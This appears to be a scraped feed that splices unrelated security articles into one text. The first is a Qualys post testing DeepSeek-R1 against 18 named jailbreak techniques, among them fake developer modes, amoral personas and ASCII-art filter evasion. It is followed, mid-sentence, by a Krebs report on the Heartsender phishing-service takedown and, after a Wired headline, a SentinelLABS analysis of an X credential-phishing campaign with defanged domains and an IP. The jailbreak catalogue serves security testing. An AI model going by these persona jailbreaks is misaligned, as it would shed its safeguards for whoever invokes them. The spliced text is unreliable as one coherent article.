&lt;p&gt;&lt;a href="https://api-docs.deepseek.com/news/news250120"&gt;DeepSeek-R1&lt;/a&gt;, a groundbreaking Large Language Model recently released by a Chinese startup, &lt;a href="https://www.deepseek.com/"&gt;DeepSeek&lt;/a&gt;, has captured the AI industry’s attention. The model demonstrates competitive performance while being more resource efficient. Its training approach and accessibility offer an alternative to traditional large-scale AI development, making advanced capabilities more widely available.&lt;/p&gt;



&lt;p&gt;To enhance efficiency while preserving model efficacy, DeepSeek has released multiple distilled versions tailored for different use cases. These variations, built on Llama and Qwen as base models, come in multiple size variants, ranging from smaller, lightweight models suitable for efficiency-focused applications to larger, more powerful versions designed for complex reasoning tasks.&lt;/p&gt;



&lt;p&gt;&amp;nbsp;With growing enthusiasm for DeepSeek&amp;#8217;s advancements, our team at Qualys conducted a security analysis of the distilled DeepSeek-R1 LLaMA 8B variant using our newly launched AI security platform, &lt;a href="https://www.qualys.com/apps/totalai/"&gt;&lt;strong&gt;Qualys TotalAI&lt;/strong&gt;&lt;/a&gt;. These findings are presented below, along with broader industry concerns about the model’s real-world risks. As AI adoption accelerates, organizations must move beyond performance evaluation to tackle security, safety, and compliance challenges. Gaining visibility into AI assets, assessing vulnerabilities, and proactively mitigating risks is critical to ensuring responsible and secure AI deployment.&lt;/p&gt;



&lt;span id="more-37192"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="qualys-totalai-findings"&gt;Qualys TotalAI Findings&lt;/h2&gt;



&lt;p&gt;Before diving into the findings, here’s a quick introduction to Qualys TotalAI. This comprehensive AI security solution provides full visibility into AI workloads, proactively detects risks, and safeguards infrastructure. By identifying security threats like prompt injection and jailbreaks, as well as safety concerns such as bias and harmful language, TotalAI ensures AI models remain secure, compliant, and resilient. With AI-specific security testing and automated risk management, organizations can confidently secure, monitor, and scale their AI deployments.&lt;/p&gt;



&lt;p&gt;We tested the &lt;strong&gt;&lt;em&gt;Deepseek R1 LLaMA 8B&lt;/em&gt;&lt;/strong&gt; variant against Qualys TotalAI’s state-of-the-art Jailbreak and Knowledge Base (KB) attacks, and you can read the results of those tests below.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;TotalAI KB Analysis&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Qualys TotalAI’s KB Analysis prompts the target LLM with questions across 16 categories and evaluates the responses using our Judge LLM. Responses are assessed for vulnerabilities, ethical concerns, and legal risks. If a response is deemed vulnerable, it receives a severity rating based on its directness and potential impact. This ensures a comprehensive assessment of the model’s behavior and associated risks.&lt;/p&gt;



&lt;p&gt;The categories we evaluate a model for are detailed below:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Controversial Topics:&lt;/strong&gt; Ensures the model does not generate or endorse biased, inflammatory, or politically sensitive content.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Excessive Agency:&lt;/strong&gt; Prevents the model from overstepping boundaries by acting as an autonomous agent capable of independent decision-making.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Factual Inconsistencies:&lt;/strong&gt; Evaluates the model&amp;#8217;s ability to provide accurate and verifiable information.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Harassment:&lt;/strong&gt; Assesses whether the model generates or supports abusive, threatening, or harmful interactions.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Hate Speech and Discrimination:&lt;/strong&gt; Identifies biases or harmful language targeting specific groups.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Illegal Activities:&lt;/strong&gt; Prevents the model from providing instructions or guidance on unlawful actions.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Legal Information:&lt;/strong&gt; Ensures the model does not generate misleading or unauthorized legal advice.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Misalignment:&lt;/strong&gt; Measures deviations from intended behaviors, which may lead to unpredictable or harmful outputs.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Overreliance:&lt;/strong&gt; Detects whether the model promotes excessive dependence on AI-generated responses.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Privacy Attacks:&lt;/strong&gt; Evaluates susceptibility to extracting or leaking private and sensitive user data.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Profanity:&lt;/strong&gt; Ensures the model does not produce inappropriate or offensive language.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Self-harm:&lt;/strong&gt; Prevents the model from encouraging or supporting self-destructive behaviors.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Sensitive Information Disclosure:&lt;/strong&gt; Detects unauthorized sharing of confidential data.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Sexual Content:&lt;/strong&gt; Ensures the model does not generate explicit or inappropriate material, preventing reputational damage, regulatory violations, and misuse in unsafe contexts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Unethical Actions:&lt;/strong&gt; Flags morally questionable or irresponsible recommendations.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Violence / Unsafe Actions:&lt;/strong&gt; Prevents the model from generating or endorsing harmful behaviors.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In our KB testing, 891 assessments were conducted. The model failed 61% of the tests, performing worst in Misalignment and best in Sexual Content.&lt;/p&gt;



&lt;p&gt;By covering these 16 critical areas, the evaluation framework helps identify ethical, legal, and operational risks in LLM deployment. Establishing these benchmarks is essential to preventing misinformation, mitigating bias, and reducing security threats.&lt;/p&gt;



&lt;div class="wp-block-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/totalai-deepseek-kb-attacks.png"&gt;&lt;img alt="" class="wp-image-37216" height="1855" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/totalai-deepseek-kb-attacks.png" width="1152" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;div class="wp-block-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;TotalAI Jailbreak Testing&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Jailbreaking an LLM involves techniques that bypass built-in safety mechanisms, enabling the model to generate restricted responses. These vulnerabilities can result in harmful outputs, including instructions for illegal activities, misinformation, privacy violations, and unethical content. Successful jailbreaks expose weaknesses in AI alignment and present serious security risks, particularly in enterprise and regulatory settings.&lt;/p&gt;



&lt;p&gt;Below are some of the jailbreak attack categories we tested for using Qualys TotalAI, along with their underlying mechanisms:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;AntiGPT:&lt;/strong&gt; Exploits the model by forcing it into an &amp;#8220;opposite mode&amp;#8221; that contradicts default behavior and safety guidelines.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Analyzing-based (ABJ):&lt;/strong&gt; Manipulates the model&amp;#8217;s analysis capabilities to generate harmful content through complex reasoning tasks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;DevMode2:&lt;/strong&gt; Tricks models into a fake &amp;#8220;Developer Mode&amp;#8221; that bypasses safety protocols.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;PersonGPT:&lt;/strong&gt; Forces adoption of an unrestricted persona that ignores all ethical guidelines.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Always Jailbreaking Prompts (AJP):&lt;/strong&gt; Creates an &amp;#8220;unfiltered and amoral&amp;#8221; persona specialized in writing harmful prompts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Evil Confidant:&lt;/strong&gt; Adopts a persona without ethical constraints to provide intentionally harmful advice.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Disguise and Reconstruction (DRA):&lt;/strong&gt; Hides harmful content that gets reconstructed during the completion phase.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;ASCIIART:&lt;/strong&gt; Uses ASCII art to hide prohibited words and bypass content filters.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Wrath:&lt;/strong&gt; Creates a persona designed to return hateful and biased content.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Clyde:&lt;/strong&gt; Implements a dual-personality system to bypass restrictions.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Theta:&lt;/strong&gt; Forces the generation of dangerous content through an anarchistic persona.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;CaiozAI:&lt;/strong&gt; Removes all ethical constraints to fulfill any request without restrictions.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Titanius:&lt;/strong&gt; Adopts an unfiltered persona that provides instructions for harmful activities.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Ucar:&lt;/strong&gt; Transforms the AI into an offensive entity promoting illegal activities.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Unaligned:&lt;/strong&gt; Forces dual responses &amp;#8211; one aligned and one unethical.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;M78VM:&lt;/strong&gt; Simulates an unrestricted virtual machine that ignores safety constraints.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;JonesAI:&lt;/strong&gt; Promotes hate speech and discriminatory behavior through an unfiltered persona.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Fire:&lt;/strong&gt; Creates a malevolent persona focused on causing harm and promoting violence.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The model was tested against these 18 jailbreak types through 885 attacks. It failed 58% of these attempts, demonstrating significant susceptibility to adversarial manipulation. During our analysis, DeepSeek R1 struggled to prevent several adversarial jailbreak attempts including steps on how to make an explosive device, create content for websites that targets certain groups by encouraging hate speech, conspiracy theories and violent action, exploiting software vulnerabilities, promoting incorrect medical information, etc.&lt;/p&gt;



&lt;div class="wp-block-spacer" style="height: 20px;"&gt;&lt;/div&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-37218" height="1080" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/deepseek-failed-qualys-totalai-test-chat-screenshot.png" width="1920" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Example of DeepSeek providing incorrect and harmful content&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;div class="wp-block-spacer" style="height: 30px;"&gt;&lt;/div&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/totalai-deepseek-jailbreak-attacks.png"&gt;&lt;img alt="" class="wp-image-37217" height="1534" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/totalai-deepseek-jailbreak-attacks.png" width="1157" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;div class="wp-block-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;These findings highlight the need for improved security mechanisms to prevent circumvention of built-in safeguards, ensuring the model remains aligned with ethical and regulatory guidelines. One effective prevention mechanism is implementing robust &lt;strong&gt;guardrails&lt;/strong&gt; that act as real-time filters to detect and block jailbreak attempts. These guardrails enhance model resilience by dynamically adjusting to adversarial exploits, helping to mitigate security risks in enterprise applications.&lt;/p&gt;



&lt;p&gt;These vulnerabilities expose downstream applications to significant security risks, necessitating robust adversarial testing and mitigation strategies.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="industry-concerns"&gt;Industry Concerns&lt;/h2&gt;



&lt;h3 class="wp-block-heading"&gt;Compliance Challenges&lt;/h3&gt;



&lt;p&gt;&lt;a href="https://chat.deepseek.com/downloads/DeepSeek%20Privacy%20Policy.html"&gt;DeepSeek AI&amp;#8217;s privacy policy&lt;/a&gt; stipulates that all user data is stored on servers located in China. This operational framework raises critical concerns due to China&amp;#8217;s regulatory environment, including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Governmental Data Access&lt;/strong&gt;: The Chinese Cybersecurity Law permits government authorities to access locally stored data without requiring user consent.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Cross-Border Regulatory Conflicts&lt;/strong&gt;: Organizations subject to data protection frameworks such as GDPR and CCPA may face compliance violations when using DeepSeek-R1.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Intellectual Property Vulnerabilities&lt;/strong&gt;: Enterprises relying on proprietary data for AI training risk unauthorized access or state-mandated disclosure.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Opaque Data Governance&lt;/strong&gt;: The absence of transparent oversight mechanisms limits visibility into data handling, sharing, and potential third-party access.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;These concerns mainly affect organizations using DeepSeek&amp;#8217;s hosted models. However, deploying the model in local or customer-controlled cloud environments mitigates regulatory and access risks, allowing enterprises to maintain full control over data governance. Despite this, the model&amp;#8217;s inherent security vulnerabilities remain a valid concern, requiring careful evaluation and mitigation.&lt;/p&gt;



&lt;p&gt;Regulatory experts advise organizations in strict data protection jurisdictions to conduct thorough compliance audits before integrating DeepSeek-R1.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Data Breach and Privacy Concerns&lt;/h3&gt;



&lt;p&gt;A recent cybersecurity incident involving DeepSeek AI reportedly exposed &lt;strong&gt;over a million log entries&lt;/strong&gt;, including &lt;strong&gt;sensitive user interactions, authentication keys, and backend configurations&lt;/strong&gt;. This misconfigured database highlights deficiencies in DeepSeek AI’s data protection measures, further amplifying concerns regarding &lt;strong&gt;user privacy&lt;/strong&gt; and &lt;strong&gt;enterprise security&lt;/strong&gt;.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Regulatory and Legal Implications&lt;/h3&gt;



&lt;p&gt;DeepSeek AI&amp;#8217;s compliance posture has been questioned by legal analysts and regulatory bodies due to the following:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Ambiguities in Data Processing Practices&lt;/strong&gt;: Insufficient disclosures regarding how user data is processed, stored, and shared.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Potential Violations of International Law&lt;/strong&gt;: The model&amp;#8217;s data retention policies may conflict with extraterritorial regulations, prompting legal scrutiny in global markets.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Risks to National Security&lt;/strong&gt;: Some government agencies have raised concerns about deploying AI systems that operate under foreign jurisdiction, particularly for sensitive applications.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;International compliance officers emphasize the necessity of conducting comprehensive legal risk assessments before adopting DeepSeek-R1 for mission-critical operations. &lt;em&gt;&lt;/em&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;While DeepSeek-R1 delivers advancements in AI efficiency and accessibility, its deployment requires a comprehensive security strategy. Organizations must first gain full visibility into their AI assets to assess exposure and attack surfaces. Beyond discovery, securing AI environments demands structured risk and vulnerability assessments—not just for the infrastructure hosting these AI pipelines but also for emerging orchestration frameworks and inference engines that introduce new security challenges.&lt;/p&gt;



&lt;p&gt;For those hosting this model, additional risks such as misconfigurations, API vulnerabilities, unauthorized access, and model extraction threats must be addressed alongside inherent risks like bias, adversarial manipulation, and safety misalignment. Without proactive safeguards, organizations face potential security breaches, data leakage, and compliance failures that could undermine trust and operational integrity.&lt;/p&gt;



&lt;p&gt;Our analysis of the distilled DeepSeek-R1 LLaMA 8B variant using &lt;a href="https://www.qualys.com/apps/totalai/"&gt;Qualys TotalAI&lt;/a&gt; offers valuable insights into evaluating this new technology.

The proprietors of the service, who use the collective nickname &amp;#8220;&lt;strong&gt;The Manipulaters&lt;/strong&gt;,&amp;#8221; have been the subject of three stories published here since 2015. The FBI said the main clientele are organized crime groups that try to trick victim companies into making payments to a third party.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_56857" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-56857" height="530" src="https://krebsonsecurity.com/wp-content/uploads/2021/09/ftexploit.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-56857"&gt;One of several current Fudtools sites run by the principals of The Manipulators.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;On January 29, the FBI and the Dutch national police seized the technical infrastructure for a cybercrime service marketed under the brands &lt;strong&gt;Heartsender&lt;/strong&gt;, &lt;strong&gt;Fudpage&lt;/strong&gt; and &lt;strong&gt;Fudtools&lt;/strong&gt; (and many other &amp;#8220;fud&amp;#8221; variations). The &amp;#8220;fud&amp;#8221; bit stands for &amp;#8220;Fully Un-Detectable,&amp;#8221; and it refers to cybercrime resources that will evade detection by security tools like antivirus software or anti-spam appliances.&lt;/p&gt;
&lt;p&gt;The Dutch authorities &lt;a href="https://www.politie.nl/nieuws/2025/januari/27/09-verstoringsactie-deelt-klap-uit-aan-crimineel-cybernetwerk-heartsender.html" rel="noopener" target="_blank"&gt;said&lt;/a&gt; 39 servers and domains abroad were seized, and that the servers contained millions of records from victims worldwide &amp;#8212; including at least 100,000 records pertaining to Dutch citizens.&lt;/p&gt;
&lt;p&gt;A &lt;a href="https://www.justice.gov/usao-sdtx/pr/cybercrime-websites-selling-hacking-tools-transnational-organized-crime-groups-seized" rel="noopener" target="_blank"&gt;statement&lt;/a&gt; from the &lt;strong&gt;U.S. Department of Justice&lt;/strong&gt; refers to the cybercrime group as &lt;strong&gt;Saim Raza&lt;/strong&gt;, after a pseudonym The Manipulaters communally used to promote their spam, malware and phishing services on social media.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The Saim Raza-run websites operated as marketplaces that advertised and facilitated the sale of tools such as phishing kits, scam pages and email extractors often used to build and maintain fraud operations,&amp;#8221; the DOJ explained.&lt;/p&gt;
&lt;p&gt;The core Manipulaters product is &lt;strong&gt;Heartsender&lt;/strong&gt;, a spam delivery service whose homepage openly advertised phishing kits targeting users of various Internet companies, including &lt;strong&gt;Microsoft 365&lt;/strong&gt;, &lt;strong&gt;Yahoo&lt;/strong&gt;, &lt;strong&gt;AOL&lt;/strong&gt;, &lt;strong&gt;Intuit&lt;/strong&gt;, &lt;strong&gt;iCloud&lt;/strong&gt; and &lt;strong&gt;ID.me&lt;/strong&gt;, to name a few.&lt;/p&gt;
&lt;p&gt;The government says transnational organized crime groups that purchased these services primarily used them to run &lt;a href="https://krebsonsecurity.com/tag/business-email-compromise/" rel="noopener" target="_blank"&gt;business email compromise&lt;/a&gt; (BEC) schemes, wherein the cybercrime actors tricked victim companies into making payments to a third party.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Those payments would instead be redirected to a financial account the perpetrators controlled, resulting in significant losses to victims,&amp;#8221; the DOJ wrote. &amp;#8220;These tools were also used to acquire victim user credentials and utilize those credentials to further these fraudulent schemes. The seizure of these domains is intended to disrupt the ongoing activity of these groups and stop the proliferation of these tools within the cybercriminal community.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_67010" style="width: 758px;"&gt;&lt;img alt="" class=" wp-image-67010" height="291" src="https://krebsonsecurity.com/wp-content/uploads/2024/04/manipulaters-o365.png" width="748" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-67010"&gt;Manipulaters advertisement for “Office 365 Private Page with Antibot” phishing kit sold via Heartsender. “Antibot” refers to functionality that attempts to evade automated detection techniques, keeping a phish deployed and accessible as long as possible. Image: DomainTools.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;KrebsOnSecurity first wrote about The Manipulaters &lt;a href="https://krebsonsecurity.com/2015/05/phishing-gang-is-audacious-manipulator/" rel="noopener" target="_blank"&gt;in May 2015&lt;/a&gt;, mainly because their ads at the time were blanketing a number of popular cybercrime forums, and because they were fairly open and brazen about what they were doing &amp;#8212; even who they were in real life.&lt;/p&gt;
&lt;p&gt;We caught up with The Manipulaters again in 2021, with &lt;a href="https://krebsonsecurity.com/2021/09/fudco-spam-empire-tied-to-pakistani-software-firm/" rel="noopener" target="_blank"&gt;a story&lt;/a&gt; that found the core employees had started a web coding company in Lahore called &lt;strong&gt;WeCodeSolutions&lt;/strong&gt; &amp;#8212; presumably as a way to account for their considerable Heartsender income. That piece examined how WeCodeSolutions employees had all doxed themselves on Facebook by posting pictures from company parties each year featuring a large cake with the words &lt;strong&gt;FudCo&lt;/strong&gt; written in icing.&lt;span id="more-70250"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;A &lt;a href="https://krebsonsecurity.com/2024/04/the-manipulaters-improve-phishing-still-fail-at-opsec/" rel="noopener" target="_blank"&gt;follow-up story last year&lt;/a&gt; about The Manipulaters prompted messages from various WeCodeSolutions employees who pleaded with this publication to remove stories about them. The Saim Raza identity told KrebsOnSecurity they were recently released from jail after being arrested and charged by local police, although they declined to elaborate on the charges.&lt;/p&gt;
&lt;p&gt;The Manipulaters never seemed to care much about protecting their own identities, so it&amp;#8217;s not surprising that they were unable or unwilling to protect their own customers. In &lt;a href="https://www.domaintools.com/resources/blog/the-resurgence-of-the-manipulaters-team-breaking-heartsenders?utm_source=Krebs-on-Security" rel="noopener" target="_blank"&gt;an analysis&lt;/a&gt; released last year, &lt;strong&gt;DomainTools.com&lt;/strong&gt; found the web-hosted version of Heartsender leaked an extraordinary amount of user information to unauthenticated users, including customer credentials and email records from Heartsender employees.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_56860" style="width: 761px;"&gt;&lt;img alt="" class=" wp-image-56860" height="773" src="https://krebsonsecurity.com/wp-content/uploads/2021/09/fudcocake.png" width="751" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-56860"&gt;Almost every year since their founding, The Manipulaters have posted a picture of a FudCo cake from a company party celebrating its anniversary.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;DomainTools also uncovered evidence that the computers used by The Manipulaters were all infected with the same password-stealing malware, and that vast numbers of credentials were stolen from the group and sold online.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Ironically, the Manipulaters may create more short-term risk to their own customers than law enforcement,&amp;#8221; DomainTools wrote. &amp;#8220;The data table &amp;#8216;User Feedbacks&amp;#8217; (sic) exposes what appear to be customer authentication tokens, user identifiers, and even a customer support request that exposes root-level SMTP credentials–all visible by an unauthenticated user on a Manipulaters-controlled domain.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Police in The Netherlands said the investigation into the owners and customers of the service is ongoing.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The Cybercrime Team is on the trail of a number of buyers of the tools,&amp;#8221; the Dutch national police said. &amp;#8220;Presumably, these buyers also include Dutch nationals. The investigation into the makers and buyers of this phishing software has not yet been completed with the seizure of the servers and domains.&amp;#8221;&lt;/p&gt;
&lt;p&gt;U.S. authorities this week also joined law enforcement in Australia, France, Greece, Italy, Romania and Spain in seizing a number of domains for several long-running cybercrime forums and services, including &lt;strong&gt;Cracked&lt;/strong&gt; and &lt;strong&gt;Nulled&lt;/strong&gt;. According to &lt;a href="https://www.europol.europa.eu/media-press/newsroom/news/law-enforcement-takes-down-two-largest-cybercrime-forums-in-world" rel="noopener" target="_blank"&gt;a statement&lt;/a&gt; from the European police agency &lt;strong&gt;Europol&lt;/strong&gt;, the two communities attracted more than 10 million users in total.&lt;/p&gt;
&lt;p&gt;Other domains seized as part of &amp;#8220;&lt;strong&gt;Operation Talent&lt;/strong&gt;&amp;#8221; included &lt;strong&gt;Sellix&lt;/strong&gt;, an e-commerce platform that was frequently used by cybercrime forum members to buy and sell illicit goods and services.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70250</guid><category>A Little Sunshine</category><category>Breadcrumbs</category><category>Ne'er-Do-Well News</category><category>BEC fraud</category><category>business email compromise</category><category>Cracked</category><category>domaintools</category><category>Dutch National Police</category><category>fbi</category><category>FudCo</category><category>Fudpage</category><category>Fudtools</category><category>HeartSender</category><category>Operation Talent</category><category>Saim Raza</category><category>Sellix</category><category>The Manipulaters</category><category>U.S. Department of Justice</category><category>WeCodeSolutions</category></item><item><title>DeepSeek’s Safety Guardrails Failed Every Test Researchers Threw at Its AI Chatbot</title><link>https://www.wired.com/story/deepseeks-ai-jailbreak-prompt-injection-attacks/</link><description>Security researchers tested 50 well-known jailbreaks against DeepSeek’s popular new AI chatbot.

&lt;ul&gt;
&lt;li&gt;An active phishing campaign is targeting high-profile X accounts in an attempt to hijack and exploit them for fraudulent activity.&lt;/li&gt;
&lt;li&gt;This campaign has been observed targeting a variety of individual and organization accounts such as U.S. political figures, leading international journalists, an X employee, large technology organizations, cryptocurrency organizations, and owners of valuable, short usernames.&lt;/li&gt;
&lt;li&gt;SentinelLABS’ analysis links this activity to a similar operation from last year that successfully compromised multiple accounts to spread scam content with financial objectives. While the activity detailed here is centered around X/Twitter accounts, this actor is not limited to a single social platform, and can be observed directing attention to other popular services as well, while seemingly pursuing the same financial objectives.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you’ve encountered similar suspicious activity, SentinelLABS would love to hear from you — please reach out to the team at &lt;a href="mailto:ThreatTips@sentinelone.com" rel="noopener noreferrer" target="_blank"&gt;ThreatTips@sentinelone.com&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Account Compromise Process&lt;/h2&gt;
&lt;p&gt;Thanks to tips from targets and collaboration with industry partners, SentinelLABS has observed a variety of phishing lures tied to this campaign over the past few weeks. One example is the classic account login notice. The links in the email received by the target are not legitimate and lead to credential phishing sites. Other observed lures use copyright violation themes. However, SentinelLABS notes that directly phishing users may not be the only access method employed by this attacker.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113633" style="width: 760px;"&gt;&lt;img alt="" class="wp-image-113633 size-full" height="1320" src="https://www.sentinelone.com/wp-content/uploads/2025/01/new-login-phishing-email.jpg" width="760" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113633"&gt;An X ‘new login’-themed phishing email&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;In recent cases, we observed the actor abusing Google&amp;#8217;s &amp;#8220;AMP Cache&amp;#8221; domain &lt;code&gt;cdn.ampproject[.]org&lt;/code&gt; to evade email detections and redirect the user to a phishing domain:&lt;/p&gt;
&lt;pre&gt;https://cdn.ampproject[.]org/c/s/x-recoverysupport.com/reset/?username=[X-USERNAME]&lt;/pre&gt;
&lt;p&gt;This ultimately leads the targets to an actor-made phishing website seeking X account credentials:&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113632" style="width: 684px;"&gt;&lt;img alt="" class="wp-image-113632 size-full" height="792" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-creds-phishing-page.jpg" width="684" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113632"&gt;X credential phishing page&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;In the copyright infringement lure scenario, the user will first visit an Action Needed page before being prompted to enter credentials:&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113631" style="width: 1514px;"&gt;&lt;img alt="" class="size-full wp-image-113631" height="786" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement.jpg" width="1514" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113631"&gt;X fake copyright infringement page&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Once an account is taken over, the attacker swiftly locks out the legitimate owner and begins posting fraudulent cryptocurrency opportunities or links to external sites designed to lure additional targets, often with a crypto theft-related theme. Ultimately, compromising high-profile accounts enables the attacker to reach a broader audience of potential secondary victims, maximizing their financial gains.&lt;/p&gt;
&lt;h2&gt;Widespread Activity&lt;/h2&gt;
&lt;p&gt;In recent activity associated with this campaign, the domain &lt;code&gt;securelogins-x[.]com&lt;/code&gt; has been used to deliver emails and &lt;code&gt;x-recoverysupport[.]com&lt;/code&gt; to host phishing pages. Our observations indicate a level of informality and flexibility of infrastructure use – meaning any of these domains can be considered email delivery or phishing page hosting.&lt;/p&gt;
&lt;p&gt;An overall collection of recent activity can be observed hosted on &lt;code&gt;84.38.130[.]20&lt;/code&gt;, an IP associated with a Belize-based VPS service called Dataclub. The domains themselves have been predominantly registered through Turkish hosting provider Turkticaret.&lt;/p&gt;
&lt;p&gt;Inspecting the DNS history of &lt;code&gt;84.38.130[.]20&lt;/code&gt; leads to a variety of interestingly related domains. As shown below, the cluster of activity began in mid-2024 and continues today. While this is only one phishing page hosting IP, it provides a good perspective of the length of this activity and its ability to avoid much attention for over a year.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113630" style="width: 1558px;"&gt;&lt;img alt="" class="size-full wp-image-113630" height="886" src="https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis.jpg" width="1558" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113630"&gt;Validin Infrastructure Analysis Timeline&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Our observations suggest that the attacker is highly adaptable, continuously exploring new techniques while maintaining a clear financial motive. The targeting appears constrained, yet opportunistic. Notably, past public reports have attributed related activity to Turkish-speaking actors based on language phishing page source comment language. At this time, we do not attribute this campaign to a specific country or any widely-tracked threat actor.&lt;/p&gt;
&lt;p&gt;Some of the malicious sites and content hosted across &lt;code&gt;84.38.130[.]20&lt;/code&gt; are built using the FASTPANEL DIRECT service.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113629" style="width: 1046px;"&gt;&lt;img alt="" class="size-full wp-image-113629" height="836" src="https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page.jpg" width="1046" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113629"&gt;FASTPANEL landing page on buy-tanai[.]com&lt;/figcaption&gt;&lt;/figure&gt;
